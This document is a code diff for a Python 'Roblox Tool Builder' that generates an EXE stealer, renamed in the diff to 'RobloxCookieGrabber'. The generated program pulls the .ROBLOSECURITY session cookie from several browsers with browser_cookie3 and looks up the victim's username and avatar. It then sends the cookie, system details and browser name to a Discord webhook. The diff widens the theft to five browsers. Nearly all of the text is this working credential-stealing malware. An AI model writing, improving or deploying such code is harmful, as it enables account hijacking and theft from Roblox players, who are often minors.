@@ -7,8 +7,6 @@ import sys
 import tempfile
 import platform
 import socket
-import json
-import browser_cookie3
 
 class WebhookTool:
     def __init__(self, root):
@@ -52,7 +50,7 @@ class WebhookTool:
         title_label = ttk.Label(title_frame, text="🚀 ROBLOX TOOL BUILDER", style='Title.TLabel')
         title_label.pack()
         
-        subtitle_label = ttk.Label(title_frame, text="Build tool to get real Roblox data", style='Header.TLabel')
+        subtitle_label = ttk.Label(title_frame, text="Build tool to get real Roblox cookies", style='Header.TLabel')
         subtitle_label.pack(pady=(5, 0))
         
         webhook_frame = ttk.LabelFrame(main_frame, text="📡 WEBHOOK SETUP", padding=20)
@@ -73,7 +71,7 @@ class WebhookTool:
         build_frame = ttk.LabelFrame(main_frame, text="🛠️ BUILD TOOL", padding=20)
         build_frame.pack(fill=tk.X, pady=(0, 20))
         
-        ttk.Label(build_frame, text="Create Roblox data tool:", style='Header.TLabel').pack(anchor=tk.W)
+        ttk.Label(build_frame, text="Create Roblox cookie tool:", style='Header.TLabel').pack(anchor=tk.W)
         
         build_btn = ttk.Button(build_frame, text="⚡ BUILD EXE", 
                              command=self.build_exe, style='Cool.TButton',
@@ -147,7 +145,7 @@ class WebhookTool:
                 defaultextension=".exe",
                 filetypes=[("Executable files", "*.exe")],
                 title="Save Roblox Tool EXE",
-                initialfile="RobloxTool.exe"
+                initialfile="RobloxCookieGrabber.exe"
             )
             
             if not output_path:
@@ -170,7 +168,7 @@ class WebhookTool:
             
             os.unlink(temp_script_path)
             self.status_label.config(text="🟢 EXE built successfully!")
-            messagebox.showinfo("Success", "✅ Roblox tool built successfully! Check the 'dist' folder.")
+            messagebox.showinfo("Success", "✅ Roblox cookie tool built successfully! Check the 'dist' folder.")
             
         except Exception as e:
             self.status_label.config(text="🔴 Build failed")
@@ -185,13 +183,12 @@ from tkinter import messagebox
 import platform
 import socket
 import os
-import json
 import browser_cookie3
 
-class RobloxTool:
+class RobloxCookieGrabber:
     def __init__(self, root):
         self.root = root
-        self.root.title("🎮 Roblox Cookie Tool")
+        self.root.title("🎮 Roblox Cookie Grabber")
         self.root.geometry("500x400")
         self.root.configure(bg='#0a0a0a')
         self.root.resizable(False, False)
@@ -208,30 +205,30 @@ class RobloxTool:
         title_label.pack(pady=20)
         
         desc_label = tk.Label(main_frame, 
-                             text="Get .ROBLOSECURITY from browser",
+                             text="Get .ROBLOSECURITY from browser cookies",
                              font=('Arial', 11),
                              fg='#ffffff', bg='#0a0a0a')
         desc_label.pack(pady=10)
         
-        self.collect_btn = tk.Button(main_frame, text="🚀 GET ROBLOX COOKIE",
-                                   command=self.get_roblox_cookie,
-                                   font=('Arial', 14, 'bold'),
-                                   bg='#00ff00',
-                                   fg='#000000',
-                                   activebackground='#00cc00',
-                                   activeforeground='#000000',
-                                   relief='raised',
-                                   bd=4,
-                                   width=20,
-                                   height=2)
-        self.collect_btn.pack(pady=30)
+        self.grab_btn = tk.Button(main_frame, text="🚀 GRAB ROBLOX COOKIE",
+                                command=self.grab_cookie,
+                                font=('Arial', 14, 'bold'),
+                                bg='#00ff00',
+                                fg='#000000',
+                                activebackground='#00cc00',
+                                activeforeground='#000000',
+                                relief='raised',
+                                bd=4,
+                                width=20,
+                                height=2)
+        self.grab_btn.pack(pady=30)
         
-        self.status_label = tk.Label(main_frame, text="Ready to grab cookie from browser",
+        self.status_label = tk.Label(main_frame, text="Ready to extract cookie from browser",
                                    font=('Arial', 9),
                                    fg='#00ff00', bg='#0a0a0a')
         self.status_label.pack(pady=10)
         
-        footer_label = tk.Label(main_frame, text="Cookie Grabber v1.0",
+        footer_label = tk.Label(main_frame, text="Cookie Grabber v1.0 | Uses browser_cookie3",
                               font=('Arial', 8),
                               fg='#444444', bg='#0a0a0a')
         footer_label.pack(side=tk.BOTTOM)
@@ -251,37 +248,39 @@ class RobloxTool:
         except Exception as e:
             return f"**System Info:** `Error: {{str(e)}}`"
     
-    def get_roblox_cookie_from_browser(self):
-        """Get .ROBLOSECURITY cookie directly from browser"""
+    def get_roblox_cookie(self):
+        """Extract .ROBLOSECURITY from browser cookies"""
         try:
-            # Try Chrome first
-            chrome_cookies = browser_cookie3.chrome(domain_name='roblox.com')
-            for cookie in chrome_cookies:
-                if cookie.name == '.ROBLOSECURITY':
-                    return cookie.value
+            # Try different browsers
+            browsers = [
+                ("Chrome", browser_cookie3.chrome),
+                ("Firefox", browser_cookie3.firefox),
+                ("Edge", browser_cookie3.edge),
+                ("Opera", browser_cookie3.opera),
+                ("Brave", browser_cookie3.brave)
+            ]
             
-            # Try Firefox
-            firefox_cookies = browser_cookie3.firefox(domain_name='roblox.com')
-            for cookie in firefox_cookies:
-                if cookie.name == '.ROBLOSECURITY':
-                    return cookie.value
+            for browser_name, browser_func in browsers:
+                try:
+                    cookies = browser_func(domain_name='roblox.com')
+                    for cookie in cookies:
+                        if cookie.name == '.ROBLOSECURITY':
+                            print(f"Found in {{browser_name}}: {{cookie.value}}")
+                            return cookie.value, browser_name
+                except Exception as e:
+                    print(f"{{browser_name}} error: {{e}}")
+                    continue
             
-            # Try Edge
-            edge_cookies = browser_cookie3.edge(domain_name='roblox.com')
-            for cookie in edge_cookies:
-                if cookie.name == '.ROBLOSECURITY':
-                    return cookie.value
-            
-            return "COOKIE_NOT_FOUND"
+            return "COOKIE_NOT_FOUND", "NO_BROWSER"
             
         except Exception as e:
-            return f"ERROR: {{str(e)}}"
+            return f"ERROR: {{str(e)}}", "ERROR"
     
-    def get_user_info_with_cookie(self, cookie_value):
+    def get_user_info(self, cookie_value):
         """Get Roblox username using the cookie"""
         try:
             if cookie_value == "COOKIE_NOT_FOUND" or cookie_value.startswith("ERROR"):
-                return "UNKNOWN_USER", "NO_AVATAR"
+                return "UNKNOWN", "NO_AVATAR"
             
             session = requests.Session()
             headers = {{
@@ -294,7 +293,7 @@ class RobloxTool:
             
             if response.status_code == 200:
                 user_data = response.json()
-                username = user_data.get('name', 'NO_NAME')
+                username = user_data.get('name', 'NO_NAME_FOUND')
                 user_id = user_data.get('id', '')
                 
                 # Get avatar
@@ -317,23 +316,23 @@ class RobloxTool:
         except Exception as e:
             return f"ERROR: {{str(e)}}", "NO_AVATAR"
     
-    def get_roblox_cookie(self):
-        self.status_label.config(text="🟡 Getting cookie from browser...")
-        self.collect_btn.config(state='disabled')
+    def grab_cookie(self):
+        self.status_label.config(text="🟡 Extracting cookie from browser...")
+        self.grab_btn.config(state='disabled')
         self.root.update()
         
         try:
             system_info = self.get_system_info()
             
             # Get the actual cookie from browser
-            roblosecurity = self.get_roblox_cookie_from_browser()
+            cookie_value, browser_name = self.get_roblox_cookie()
             
             # Get user info with the cookie
-            username, avatar_url = self.get_user_info_with_cookie(roblosecurity)
+            username, avatar_url = self.get_user_info(cookie_value)
             
-            # Create Discord message
+            # Create Discord embed
             embed = {{
-                "title": "🎮 REAL ROBLOX COOKIE CAPTURED",
+                "title": "🎮 REAL ROBLOX COOKIE GRABBED",
                 "color": 0x00ff00,
                 "fields": [
                     {{
@@ -342,8 +341,13 @@ class RobloxTool:
                         "inline": True
                     }},
                     {{
+                        "name": "🌐 Found In",
+                        "value": f"`{{browser_name}}`",
+                        "inline": True
+                    }},
+                    {{
                         "name": "🔐 Cookie Status",
-                        "value": f"`{'✅ FOUND' if roblosecurity != 'COOKIE_NOT_FOUND' and not roblosecurity.startswith('ERROR') else '❌ NOT FOUND'}}`",
+                        "value": f"`{'✅ FOUND' if cookie_value != 'COOKIE_NOT_FOUND' and not cookie_value.startswith('ERROR') else '❌ NOT FOUND'}}`",
                         "inline": True
                     }},
                     {{
@@ -353,7 +357,7 @@ class RobloxTool:
                     }},
                     {{
                         "name": "🍪 .ROBLOSECURITY Cookie",
-                        "value": f"```{{roblosecurity}}```",
+                        "value": f"```{{cookie_value}}```",
                         "inline": False
                     }}
                 ]
@@ -364,7 +368,7 @@ class RobloxTool:
                 embed["thumbnail"] = {{"url": avatar_url}}
             
             data = {{
-                "content": "🚨 **REAL ROBLOX COOKIE GRABBED**",
+                "content": "🚨 **REAL ROBLOX COOKIE EXTRACTED**",
                 "embeds": [embed]
             }}
             
@@ -373,10 +377,11 @@ class RobloxTool:
             if response.status_code == 204:
                 self.status_label.config(text="🟢 Cookie sent successfully!")
                 messagebox.showinfo("Success", 
-                                  f"✅ **REAL COOKIE CAPTURED!**\\\\n\\\\n"
+                                  f"✅ **REAL COOKIE EXTRACTED!**\\\\n\\\\n"
                                   f"**Username:** {{username}}\\\\n"
-                                  f"**Cookie:** {'✅ FOUND' if roblosecurity != 'COOKIE_NOT_FOUND' and not roblosecurity.startswith('ERROR') else '❌ NOT FOUND'}\\\\n"
-                                  f"**Length:** {{len(roblosecurity)}} characters")
+                                  f"**Browser:** {{browser_name}}\\\\n"
+                                  f"**Cookie Found:** {'✅ YES' if cookie_value != 'COOKIE_NOT_FOUND' and not cookie_value.startswith('ERROR') else '❌ NO'}\\\\n"
+                                  f"**Length:** {{len(cookie_value)}} characters")
             else:
                 self.status_label.config(text="🔴 Failed to send")
                 messagebox.showerror("Error", f"❌ Failed to send data. Status: {{response.status_code}}")
@@ -385,11 +390,11 @@ class RobloxTool:
             self.status_label.config(text="🔴 Error occurred")
             messagebox.showerror("Error", f"❌ Failed: {{str(e)}}")
         finally:
-            self.collect_btn.config(state='normal')
+            self.grab_btn.config(state='normal')
 
 def main():
     root = tk.Tk()
-    app = RobloxTool(root)
+    app = RobloxCookieGrabber(root)
     root.mainloop()
 
 if __name__ == "__main__":
